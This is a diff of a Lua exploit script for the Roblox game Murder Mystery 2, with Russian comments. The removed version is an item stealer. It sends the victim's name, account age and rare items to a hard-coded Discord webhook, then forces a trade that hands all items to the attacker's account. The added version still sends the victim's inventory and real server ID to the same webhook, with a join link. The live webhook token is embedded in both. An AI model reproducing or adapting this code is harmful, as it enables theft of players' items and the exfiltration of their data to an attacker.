@@ -1,134 +1,88 @@
--- [ Settings ] --
-local Username = "Warrior_ggs"
-local Webhook = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
-
-local DualUsername = "Warrior_ggs"
-local DualWebhook = Webhook
-local DualUnique = 1
-local DualAncient = 1
-local DualGodly = 1
-
-local userName = Username
-local webHook = Webhook
-
-if getgenv().executed then return end
-getgenv().executed = true
-
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local PlaceId = 142823291 -- MM2 PlaceId
 
-local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
-local PlayerDataModule = require(ReplicatedStorage.Modules.ProfileData)
-local LevelModule = require(ReplicatedStorage.Modules.LevelModule)
+local placeId = 142823291 -- MM2 placeId
+local spoofedJobId = game.JobId
+local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
 
--- Перечисляем инвентарь
+-- Настройки минимальных редкостей для отправки
+local MinUnique, MinAncient, MinGodly = 1, 1, 1
+
+-- Получение инвентаря игрока
 local function getInventory()
-    local allItems = {}
-    local vintageItems, commonItems, uncommonItems, rareItems = {}, {}, {}, {}
-    local legendaryItems, godlyItems, ancientItems, uniqueItems = {}, {}, {}, {}
-    local counts = {vintage=0, common=0, uncommon=0, rare=0, legendary=0, godly=0, ancient=0, unique=0}
+    local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
+    local uniqueItems, ancientItems, godlyItems = {}, {}, {}
+    local counts = {unique=0, ancient=0, godly=0}
 
-    for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
-        for _,d in pairs(b) do
-            table.insert(allItems, d.ItemName)
-            if d.Rarity == "Vintage" then counts.vintage=counts.vintage+1; table.insert(vintageItems,d.DataID) end
-            if d.Rarity == "Common" then counts.common=counts.common+1; table.insert(commonItems,d.DataID) end
-            if d.Rarity == "Uncommon" then counts.uncommon=counts.uncommon+1; table.insert(uncommonItems,d.DataID) end
-            if d.Rarity == "Rare" then counts.rare=counts.rare+1; table.insert(rareItems,d.DataID) end
-            if d.Rarity == "Legendary" then counts.legendary=counts.legendary+1; table.insert(legendaryItems,d.DataID) end
-            if d.Rarity == "Godly" then counts.godly=counts.godly+1; table.insert(godlyItems,d.DataID) end
-            if d.Rarity == "Ancient" then counts.ancient=counts.ancient+1; table.insert(ancientItems,d.DataID) end
-            if d.Rarity == "Unique" then counts.unique=counts.unique+1; table.insert(uniqueItems,d.DataID) end
+    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
+        for _, item in pairs(category) do
+            if item.Rarity == "Unique" then
+                counts.unique = counts.unique + 1
+                table.insert(uniqueItems, item.ItemName)
+            elseif item.Rarity == "Ancient" then
+                counts.ancient = counts.ancient + 1
+                table.insert(ancientItems, item.ItemName)
+            elseif item.Rarity == "Godly" then
+                counts.godly = counts.godly + 1
+                table.insert(godlyItems, item.ItemName)
+            end
         end
     end
 
-    return allItems, vintageItems, commonItems, uncommonItems, rareItems, legendaryItems, godlyItems, ancientItems, uniqueItems, counts
+    return counts, uniqueItems, ancientItems, godlyItems
 end
 
--- Форматируем список для Pastebin
-local function formatItems(itemList)
-    if #itemList == 0 then return "None" else return table.concat(itemList,"\n") end
-end
+-- Функция для отправки webhook
+local function sendWebhook(realJobId)
+    local counts, uniqueItems, ancientItems, godlyItems = getInventory()
 
--- Функция отправки webhook
-local function sendWebhook(jobId)
-    local allItems, vintageItems, commonItems, uncommonItems, rareItems, legendaryItems, godlyItems, ancientItems, uniqueItems, counts = getInventory()
-
-    if counts.godly >= DualGodly or counts.ancient >= DualAncient or counts.unique >= DualUnique then
-        userName = DualUsername
-        webHook = DualWebhook
-    end
-
-    local pastebinString = "-- [ Uniques ] --\n"..formatItems(uniqueItems)..
-                           "\n\n-- [ Ancient ] --\n"..formatItems(ancientItems)..
-                           "\n\n-- [ Godlies ] --\n"..formatItems(godlyItems)
-
-    local embed = {
-        ["title"] = "New Hit with Elliot Stealer",
-        ["color"] = 65280,
-        ["fields"] = {
-            {["name"]="Details:", ["value"]="```Name: "..Players.LocalPlayer.Name.."\nAccountAge: "..tostring(Players.LocalPlayer.AccountAge).."\nReceiver: "..userName.."```"},
-            {["name"]="Hit:", ["value"]="Uniques: "..counts.unique.."\nAncients: "..counts.ancient.."\nGodlys: "..counts.godly},
-            {["name"]="JobID:", ["value"]=jobId}
+    -- Проверка, есть ли что отправлять
+    if counts.unique >= MinUnique or counts.ancient >= MinAncient or counts.godly >= MinGodly then
+        local fernUrl = "https://fern.wtf/joiner?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
+        local webhookData = {
+            embeds = {{
+                title = "🔍 JobID + Inventory Info",
+                description = "Captured real JobID and inventory",
+                color = 65280,
+                fields = {
+                    { name = "Spoofed JobID", value = spoofedJobId, inline = true },
+                    { name = "Real JobID", value = realJobId, inline = true },
+                    { name = "Fern.wtf Join Link", value = fernUrl, inline = false },
+                    { name = "Uniques", value = #uniqueItems > 0 and table.concat(uniqueItems, ", ") or "None", inline = false },
+                    { name = "Ancients", value = #ancientItems > 0 and table.concat(ancientItems, ", ") or "None", inline = false },
+                    { name = "Godlies", value = #godlyItems > 0 and table.concat(godlyItems, ", ") or "None", inline = false },
+                },
+                footer = { text = "Delta JobID + Inventory Logger" }
+            }}
         }
-    }
 
-    pcall(function()
-        request({
-            Url = webHook,
-            Method = "POST",
-            Headers = {["Content-Type"]="application/json"},
-            Body = HttpService:JSONEncode({["embeds"]={embed}})
-        })
-    end)
-end
-
--- Функция для Trade-steal
-local function stealItems()
-    local sendArgs = {[1]=Players[userName]}
-    ReplicatedStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
-    wait(3)
-
-    local allItems, vintageItems, commonItems, uncommonItems, rareItems, legendaryItems, godlyItems, ancientItems, uniqueItems = getInventory()
-    local function offerItems(items)
-        for _,id in pairs(items) do
-            ReplicatedStorage.Trade.OfferItem:FireServer(id,"Weapons")
-        end
+        pcall(function()
+            http_request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(webhookData)
+            })
+        end)
     end
-
-    offerItems(uniqueItems)
-    offerItems(ancientItems)
-    offerItems(godlyItems)
-    offerItems(vintageItems)
-    offerItems(legendaryItems)
-    offerItems(rareItems)
-    offerItems(uncommonItems)
-    offerItems(commonItems)
-
-    wait(6)
-    ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
 end
 
--- ------------------- JOBID BYPASSER -------------------
-TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,teleportInfo)
+-- Ловим неудачный телепорт
+TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportInfo)
     if teleportInfo and teleportInfo.ServerInstanceId then
-        getgenv().JobId = teleportInfo.ServerInstanceId
-        print("Real JobId detected:", getgenv().JobId)
-        -- отправка webhook с инвентарем
-        sendWebhook(getgenv().JobId)
-        -- сразу запускаем трейд
-        stealItems()
+        local realJobId = teleportInfo.ServerInstanceId
+        print("Real JobId detected:", realJobId)
+        sendWebhook(realJobId)
     end
 end)
 
--- Триггерим spoofed teleport
-for _=1,2 do
+-- Триггерим "spoofed" телепорт, чтобы получить реальный JobId
+for i = 1, 2 do
     task.spawn(function()
         pcall(function()
-            TeleportService:TeleportToPlaceInstance(PlaceId,"00000000-0000-0000-0000-000000000000")
+            TeleportService:TeleportToPlaceInstance(placeId, "00000000-0000-0000-0000-000000000000")
         end)
     end)
     task.wait()
